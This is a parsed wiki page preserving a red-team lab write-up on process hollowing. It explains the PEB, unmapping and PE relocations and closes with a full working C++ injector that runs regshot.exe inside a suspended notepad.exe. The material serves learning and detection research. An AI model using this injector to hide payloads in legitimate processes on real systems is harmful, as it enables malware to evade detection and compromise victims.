---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Process Hollowing and Portable Executable Relocations

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-process-hollowing-and-pe-image-relocations` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Process Hollowing and Portable Executable Relocations](../../topics/offensive-security/process-hollowing-and-portable-executable-relocations.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-process-hollowing-and-pe-image-relocations |
| name | Process Hollowing and Portable Executable Relocations |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2019-04-28 16-44.gif
- Peek 2019-04-28 16-53.gif
- Peek 2019-04-28 17-12.gif
- Peek 2019-04-28 17-16.gif
- Peek 2019-04-28 17-44.gif
- Peek 2019-04-29 21-27.gif
- Screenshot from 2019-04-28 16-28-59.png
- Screenshot from 2019-04-28 16-33-33.png
- Screenshot from 2019-04-28 16-36-33.png
- Screenshot from 2019-04-28 16-38-29.png
- Screenshot from 2019-04-28 16-39-47.png
- Screenshot from 2019-04-28 16-41-15.png
- Screenshot from 2019-04-28 16-47-39.png
- Screenshot from 2019-04-28 16-50-46.png
- Screenshot from 2019-04-28 16-52-13.png
- Screenshot from 2019-04-28 16-59-40.png
- Screenshot from 2019-04-28 17-08-28.png
- Screenshot from 2019-04-28 17-12-18.png
- Screenshot from 2019-04-28 17-14-51.png
- Screenshot from 2019-04-28 17-23-57.png
- Screenshot from 2019-04-28 17-27-06.png
- Screenshot from 2019-04-28 17-30-39.png
- Screenshot from 2019-04-28 17-44-19.png
- Screenshot from 2019-04-28 17-47-47.png
- Screenshot from 2019-04-28 17-48-03.png
- Screenshot from 2019-04-28 17-53-11.png
- Screenshot from 2019-04-28 18-40-56.png
- Screenshot from 2019-04-29 21-15-38.png
- Screenshot from 2019-04-30 22-19-42.png
- Screenshot from 2019-04-30 22-58-35.png
- Screenshot from 2019-05-01 19-38-34.png
- Screenshot from 2019-05-01 19-58-53.png
_body: "---\ndescription: Code injection, evasion\n---\n\n# Process Hollowing and Portable Executable Relocations\n\nThis\
  \ lab is my attempt to better understand and implement a well known code injection technique called process hollowing, where\
  \ a victim process is created in a suspended state, its image is carved out from memory, a malicious binary gets written\
  \ instead and the program state is resumed to execute the injected code.\n\nAlthough my implementation of process hollowing\
  \ does not work with all binaries, I still found it valuable in doing this lab since the aim was to:\n\n* get a better understanding\
  \ of the technique's technicalities under the hood\n* become a bit more comfortable with C++ and Windows APIs\n* get a bit\
  \ more familiar with image relocations\n* become a bit more comfortable with inspecting / manipulating program's memory\n\
  * get to do more PE parsing and PE relocations\n\nThe main reference resource for this lab was [https://github.com/m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing).\
  \ \\\nShout out to [Mumbai](https://twitter.com/ilove2pwn\\_) for a great debugging session and as usual, talking C to me!\n\
  \nIf you need more info on parsing Windows PE files, see my previous lab:\n\n{% content-ref url=\"../../miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++.md\"\
  \ %}\n[pe-file-header-parser-in-c++.md](../../miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++.md)\n\
  {% endcontent-ref %}\n\n## Execution\n\n{% hint style=\"warning\" %}\nYou may notice that `ImageBaseAddress` varies across\
  \ the screenshots. \\\nThis is because I ran the binary multiple times and the ASLR played its role.\n{% endhint %}\n\n\
  ### Destination / Host Image\n\nLet's start calc.exe as our host / destination process - this is going to be the process\
  \ that we will be hollowing out and attempt to replace it with cmd.exe.\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-28\
  \ 16-28-59.png>)\n\n### Destination ImageBaseAddress\n\nNow, in order to hollow out the destination process, we need to\
  \ know its `ImageBaseAddress`. We can get the location of image base address from the [PEB](../../miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block.md)\
  \ structure of the host process via WinDBG - we know that the PEB is located at 0100e000:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-28 16-36-33.png>)\n\n..and we also know that the `ImageBaseAddress`is 8 bytes away from the PEB:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-28 16-38-29.png>)\n\nSo, in the code we can get the offset location like so:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-28 16-33-33.png>)\n\nFinally, we can then get the `ImageBaseAddress` by reading that memory location:\n\n\
  ![](<../../.gitbook/assets/Screenshot from 2019-04-28 16-39-47.png>)\n\nLet's confirm we got the right `ImageBaseAddress`:\n\
  \n```\ndt _peb @$peb\n```\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-28 16-41-15.png>)\n\nWe will come back to\
  \ the hollowing the destination image located at `ImageBaseAddress` in a moment.\n\n### Source Image\n\nLet's now switch\
  \ gears to the source file - the binary that we want to execute inside the host/destination  process. In my case it's -\
  \ cmd.exe. I've opened the file, allocated required memory and read the file to that memory location:\n\n![](<../../.gitbook/assets/Peek\
  \ 2019-04-28 16-44.gif>)\n\n### Source Image Size\n\nLet's get the `SizeOfImage` of the source image (cmd.exe) from its\
  \ Optional Headers of the PE we just read - we need to know this value since we will need to allocate that much memory in\
  \ the destination process (calc) in order to copy over the souce image (cmd):\n\n![](<../../.gitbook/assets/Screenshot from\
  \ 2019-04-28 16-47-39.png>)\n\n### Destination Image Unmapping\n\nWe can now carve / hollow out the destination image. Note\
  \ how at the moment, before we perform the hollowing, the memory at address `01390000` (`ImageBaseAddress`) contains the\
  \ calc.exe image:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-28 16-50-46.png>)\n\nLet's proceed with the hollowing:\n\
  \n![](<../../.gitbook/assets/Screenshot from 2019-04-28 16-52-13.png>)\n\nIf we check the `ImageBaseAddress` now, we can\
  \ see the image is gone:\n\n![](<../../.gitbook/assets/Peek 2019-04-28 16-53.gif>)\n\n### Allocating Memory In Destination\
  \ Image\n\nWe now need to allocate a block of memory of size `SizeOfImage` in the destination process that will be our new\
  \ `ImageBaseAddress` of the source image. Ideally, we would allocate new memory at ImageBaseAddress of the destination image,\
  \ however I was getting an error `ERROR_INVALID_ADDRESS,`although I could see the memory at that address was properly unmapped.\
  \ Additionally it was committed previously and contained the destination image:\n\n![Not sure if this is the main reason\
  \ the lab failed.](<../../.gitbook/assets/Screenshot from 2019-04-28 18-40-56.png>)\n\nMicrosoft on `ERROR_INVALID_ADDRESS`:\n\
  \n> If this address is within an enclave that you have not initialized by calling [InitializeEnclave](https://msdn.microsoft.com/6A711135-A522-40AE-965F-E1AF97D0076A),\
  \ **VirtualAllocEx** allocates a page of zeros for the enclave at that address. The page must be previously uncommitted,\
  \ and will not be measured with the EEXTEND instruction of the Intel Software Guard Extensions programming model.\n>\n>\
  \ If the address in within an enclave that you initialized, then the allocation operation fails with the **ERROR\\_INVALID\\\
  _ADDRESS** error.\n\nAlthough I did not use enclaves, I am not sure if Windows 10 did that for me as part of some API call\
  \ I used or when loading the destination process in memory.\n\nInteresting to note that even the main reference resource\
  \ I used for this lab was failing with the same error.\n\nFor the above reason, I let the compiler decide where new memory\
  \ will be allocated. After the memory has been allocated, we need to calculate the delta between the `ImageBaseAddress`\
  \ of the destination image and the source image's preferred `ImageBase`- this is required for patching the binary during\
  \ the relocations phase:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-28 16-59-40.png>)\n\n### Copying Source Image\
  \ Headers\n\nWe can now copy over the source image headers into the newly allocated memory in the destination process:\n\
  \n![](<../../.gitbook/assets/Peek 2019-04-28 17-16.gif>)\n\n### Copying Source Image Sections to Destination Process\n\n\
  Let's now get the first Section Header of the source file and make sure we are reading it correctly by comparing the details\
  \ via a PE parser:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-28 17-08-28.png>)\n\nWe can now copy over all the\
  \ PE sections of the source file to the destination process. This loop will do it for us:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-28 17-12-18.png>)\n\nBelow shows how a .text section is copied over from the disk to memory:\n\n![](<../../.gitbook/assets/Peek\
  \ 2019-04-28 17-12.gif>)\n\nWe can see the bytes on the disk (left) match those in memory (right), so we know the section\
  \ was copied over successfully - the same will be done with other remaining sections:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-28 17-14-51.png>)\n\n### Relocation\n\nNow it's time to perform image base relocations.&#x20;\n\nSince our\
  \ source image was loaded to a different `ImageBaseAddress` compared to where the destination process was loaded into initially,\
  \ it needs to be patched in order for the binary to resolve addresses to things like static variables and other absolute\
  \ addresses which otherwise would no longer work. The way the windows loader knows how to patch the images in memory is\
  \ by referring to a relocation table residing in the binary.\n\nRelocation table contains:\n\n* A number of variable sized\
  \ relocation blocks for each memory page\n* Relocation block defines its Relative (to image base) Virtual Address location\
  \ (first 4 bytes of the relocation block)\n* Relocation block specifies its size (bytes 5-8 from the beginning of the relocation\
  \ block)\n* After the block size, there is a list of 2 byte pairs denoting the patching instructions, where the first 4\
  \ bits indicate relocation type and the remaining 12 bits signify the location of the bytes (relative to the image base)\
  \ that actually need to be patched\n\nHere's a diagram of the above points, where Block 1..N are relocation blocks and B1P-BNP\
  \ are the required patch definitions (relocation type and relocation address) themselves:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-05-01 19-38-34.png>)\n\nThis is how it looks like in the hex dump of a binary regshot.exe (see Updates to know\
  \ why I switched the binaries):\n\n![](<../../.gitbook/assets/Screenshot from 2019-05-01 19-58-53.png>)\n\nIn order to do\
  \ relocations in code, we first need to find a pointer to the relocations table, which is essentially a `.reloc` section\
  \ in our source binary:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-28 17-23-57.png>)\n\n### Reading First Relocation\
  \ Block\n\nNow, let's get the information about the fist relocation block and make sure we are reading it correctly:\n\n\
  ![](<../../.gitbook/assets/Screenshot from 2019-04-28 17-27-06.png>)\n\n### Getting Relocations Count\n\nSince we know the\
  \ relocation block size and the size of an individual relocation entry, we can work out how many relocations this block\
  \ defines:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-28 17-30-39.png>)\n\n### Relocating\n\nBelow loop will\
  \ fix up the required memory locations. It works by:\n\n* finding the relocation table and cycling through the relocation\
  \ blocks\n* getting the nuber of required relocations in each relocation block\n* reading bytes in the specified relocation\
  \ addresses\n* applying delta (between source and destination imageBaseAddress) to the values specified in the relocation\
  \ addresses\n* writing the new values to specified relocation addresses\n* repeating the above until the entire relocation\
  \ table is traversed\n\nSee [Update #2](process-hollowing-and-pe-image-relocations.md#update-2) for more:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-28 17-44-19.png>)\n\nBelow shows how the loop iterates through the relocation entries (cross reference bottom\
  \ right screen for RVAs) and patches the memory as seen in the top right corner:\n\n![](<../../.gitbook/assets/Peek 2019-04-28\
  \ 17-44.gif>)\n\n### Changing AddressOfEntryPoint\n\nAfter the fix-ups are done, we need to capture the destination process\
  \ thread context, since it conains a pointer to the `eax` register which we will need to update with `AddressOfEntryPoint`\
  \ of the source image:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-28 17-47-47.png>)\n\nOnce that is done, we\
  \ can update the `AddressOfEntryPoint` of the source image, update the thread with the new entry point and resume the thread:\n\
  \n![](<../../.gitbook/assets/Screenshot from 2019-04-28 17-48-03.png>)\n\nAt this point, if we compile and run the program,\
  \ our cmd.exe should be launched inside the hollowed out calc.exe. Unfortunately, in my lab environment, this failed with:\n\
  \n![](<../../.gitbook/assets/Screenshot from 2019-04-28 17-53-11.png>)\n\nI must have messed something up along the way.\
  \ Having said that, I tried compiling and running the POC provided at [https://github.com/m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing)\
  \ and cross referenced results of my program with the POC - everything matched up, includig the final error :)\n\nIf you\
  \ are reading this and you see what I have missed, as always, I want to hear from you.\n\n## Update #1\n\nAfter talking\
  \ to [@mumbai](https://twitter.com/ilove2pwn\\_), the issue I was having with [memory allocation](process-hollowing-and-pe-image-relocations.md#allocating-memory-in-destination-image)\
  \ in the destination process at the `ImageBaseAddress` is now magically gone (?). This means that I can now perform process\
  \ hollowing and I will be using notepad.exe (line 28) as the destination process and regshot.exe (line 42) will be written\
  \ to the hollowed notepad.exe process:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-29 21-15-38.png>)\n\nBelow\
  \ is a powershell one-liner that constantly checks if there's a notepad.exe process running (our destination process). Once\
  \ found, it checks if a process `*regshot*` (our source binary) is running (to prove that it is not, since it should be\
  \ hidden inside the notepad.exe) and breaks the loop:\n\n```csharp\nwhile(1) { get-process | ? {$_.name -match 'notepad'}\
  \ | % { $_; get-process \"*regshot*\"; break } }\n```\n\nBelow shows this all in action - once the program is compiled and\
  \ executed, notepad.exe is launched, powershell loop (top right) stops. Note how regshot.exe is not visible in the process\
  \ list, however when closing it, notepad.exe gets killed together - the hollow is successful:\n\n![](<../../.gitbook/assets/Peek\
  \ 2019-04-29 21-27.gif>)\n\n## Update #2\n\nZooming in a bit further on the PE relocations:\n\n* Source image regshot.exe\
  \ preferred image base is `00400000`\n* Destination image notepad.exe image base got loaded into `00380000`\n* Delta between\
  \ images is `00400000 - 00380000 = 80000h`\n* Bottom right shows that address in the destination image at address `imageBase\
  \ + 1210h` needs to be fixed up using `IMAGE_REL_BASED_HIGHLOW`relocation type\n  * Relocation type is worked out by taking\
  \ the first 4 bits of the value stored in the relocation entry block, which in this case is **3**210h - bottom left screenshot\
  \ or bottom right (data column)\n  * **3**210h in bits - **0011** 0010 0001 0000 and the first 4 bits are 0011 which is\
  \ 3 in decimal\n* Top right (source image / notepad) shows that at `00381210` (00380000 + 1210h = 00381210) the value contained\
  \ is `0040E7A5`, suggesting the address is based on the preferred image base of regshot since it starts with 0040xxxx\n\
  * `0040E7A5` would work OK for regshot if its image had been loaded at 00400000, but since it got loaded instead of notepad's\
  \ image base at `00380000`, it needs to be patched by applying the delta (80000h) between images like so:\n\n$$\n0040E7A5\
  \ - 80000h = 38E7A5\n$$\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-30 22-19-42.png>)\n\nAfter executing the code\
  \ line 118 (top left in the screenshot above), `0040E7A5` got patched to the new location `0038E7A5` matching the new image\
  \ base `00380000`that of notepad.exe (destination process):\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-30 22-58-35.png>)\n\
  \n## Code\n\n{% code title=\"process-hollowing.cpp\" %}\n```cpp\n// process-hollowing.cpp : This file contains the 'main'\
  \ function. Program execution begins and ends there.\n//\n\n#include \"pch.h\"\n#include <iostream>\n#include <Windows.h>\n\
  #include <winternl.h>\n\nusing NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);\n\ntypedef struct BASE_RELOCATION_BLOCK\
  \ {\n\tDWORD PageAddress;\n\tDWORD BlockSize;\n} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;\n\ntypedef struct BASE_RELOCATION_ENTRY\
  \ {\n\tUSHORT Offset : 12;\n\tUSHORT Type : 4;\n} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;\n\nint main()\n{\n\t//\
  \ create destination process - this is the process to be hollowed out\n\tLPSTARTUPINFOA si = new STARTUPINFOA();\n\tLPPROCESS_INFORMATION\
  \ pi = new PROCESS_INFORMATION();\n\tPROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();\n\tDWORD returnLenght\
  \ = 0;\n\tCreateProcessA(NULL, (LPSTR)\"c:\\\\windows\\\\syswow64\\\\notepad.exe\", NULL, NULL, TRUE, CREATE_SUSPENDED,\
  \ NULL, NULL, si, pi);\n\tHANDLE destProcess = pi->hProcess;\n\n\t// get destination imageBase offset address from the PEB\n\
  \tNtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);\n\
  \tDWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8; \n\t\n\t// get destination imageBaseAddress\n\tLPVOID destImageBase\
  \ = 0;\n\tSIZE_T bytesRead = NULL;\n\tReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);\n\
  \n\t// read source file - this is the file that will be executed inside the hollowed process\n\tHANDLE sourceFile = CreateFileA(\"\
  C:\\\\temp\\\\regshot.exe\", GENERIC_READ,\tNULL, NULL, OPEN_ALWAYS, NULL, NULL);\n\tDWORD sourceFileSize = GetFileSize(sourceFile,\
  \ NULL);\n\tLPDWORD fileBytesRead = 0;\n\tLPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);\n\
  \tReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);\n\t\n\t// get source image size\n\tPIMAGE_DOS_HEADER\
  \ sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;\n\tPIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer\
  \ + sourceImageDosHeaders->e_lfanew);\n\tSIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;\n\n\t\
  // carve out the destination image\n\tNtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA(\"\
  ntdll\"), \"NtUnmapViewOfSection\"));\n\tmyNtUnmapViewOfSection(destProcess, destImageBase);\n\n\t// allocate new memory\
  \ in destination image for the source image\n\tLPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize,\
  \ MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tdestImageBase = newDestImageBase;\n\n\t// get delta between sourceImageBaseAddress\
  \ and destinationImageBaseAddress\n\tDWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;\n\
  \n\t// set sourceImageBase to destImageBase and copy the source Image headers to the destination image\n\tsourceImageNTHeaders->OptionalHeader.ImageBase\
  \ = (DWORD)destImageBase;\n\tWriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders,\
  \ NULL);\n\n\t// get pointer to first source image section\n\tPIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer\
  \ + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));\n\tPIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;\n\
  \tint err = GetLastError();\n\n\t// copy source image sections to destination\n\tfor (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections;\
  \ i++)\n\t{\n\t\tPVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);\n\
  \t\tPVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);\n\t\tWriteProcessMemory(destProcess,\
  \ destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);\n\t\tsourceImageSection++;\n\
  \t}\n\n\t// get address of the relocation table\n\tIMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n\
  \t\n\t// patch the binary with relocations\n\tsourceImageSection = sourceImageSectionOld;\n\tfor (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections;\
  \ i++)\n\t{\n\t\tBYTE* relocSectionName = (BYTE*)\".reloc\";\n\t\tif (memcmp(sourceImageSection->Name, relocSectionName,\
  \ 5) != 0) \n\t\t{\n\t\t\tsourceImageSection++;\n\t\t\tcontinue;\n\t\t}\n\n\t\tDWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;\n\
  \t\tDWORD relocationOffset = 0;\n\n\t\twhile (relocationOffset < relocationTable.Size) {\n\t\t\tPBASE_RELOCATION_BLOCK relocationBlock\
  \ = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);\n\t\t\trelocationOffset\
  \ += sizeof(BASE_RELOCATION_BLOCK);\n\t\t\tDWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK))\
  \ / sizeof(BASE_RELOCATION_ENTRY);\n\t\t\tPBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer\
  \ + sourceRelocationTableRaw + relocationOffset);\n\n\t\t\tfor (DWORD y = 0; y < relocationEntryCount; y++)\n\t\t\t{\n\t\
  \t\t\trelocationOffset += sizeof(BASE_RELOCATION_ENTRY);\n\n\t\t\t\tif (relocationEntries[y].Type == 0)\n\t\t\t\t{\n\t\t\
  \t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tDWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;\n\
  \t\t\t\tDWORD patchedBuffer = 0;\n\t\t\t\tReadProcessMemory(destProcess,(LPCVOID)((DWORD)destImageBase + patchAddress),\
  \ &patchedBuffer, sizeof(DWORD), &bytesRead);\n\t\t\t\tpatchedBuffer += deltaImageBase;\n\n\t\t\t\tWriteProcessMemory(destProcess,\t\
  (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);\n\t\t\t\tint a = GetLastError();\n\
  \t\t\t}\n\t\t}\n\t}\n\n\t// get context of the dest process thread\n\tLPCONTEXT context = new CONTEXT();\n\tcontext->ContextFlags\
  \ = CONTEXT_INTEGER;\n\tGetThreadContext(pi->hThread, context);\n\n\t// update dest image entry point to the new entry point\
  \ of the source image and resume dest image thread\n\tDWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;\n\
  \tcontext->Eax = patchedEntryPoint;\n\tSetThreadContext(pi->hThread, context);\n\tResumeThread(pi->hThread);\n\n\treturn\
  \ 0;\n}\n\n```\n{% endcode %}\n\n## References\n\n{% embed url=\"https://github.com/m0n0ph1/Process-Hollowing\" %}\n\nWhat\
  \ an amazing resource for those interested in detecting process hollowing using memory forensics techniques:\n\n{% embed\
  \ url=\"https://cysinfo.com/detecting-deceptive-hollowing-techniques/\" %}\n\n{% embed url=\"https://attack.mitre.org/techniques/T1093/\"\
  \ %}\n\n{% embed url=\"https://github.com/peperunas/injectopi/tree/master/FullCopy\" %}\n\n{% content-ref url=\"../../miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++.md\"\
  \ %}\n[pe-file-header-parser-in-c++.md](../../miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++.md)\n\
  {% endcontent-ref %}"
_relative_path: offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations.md
````
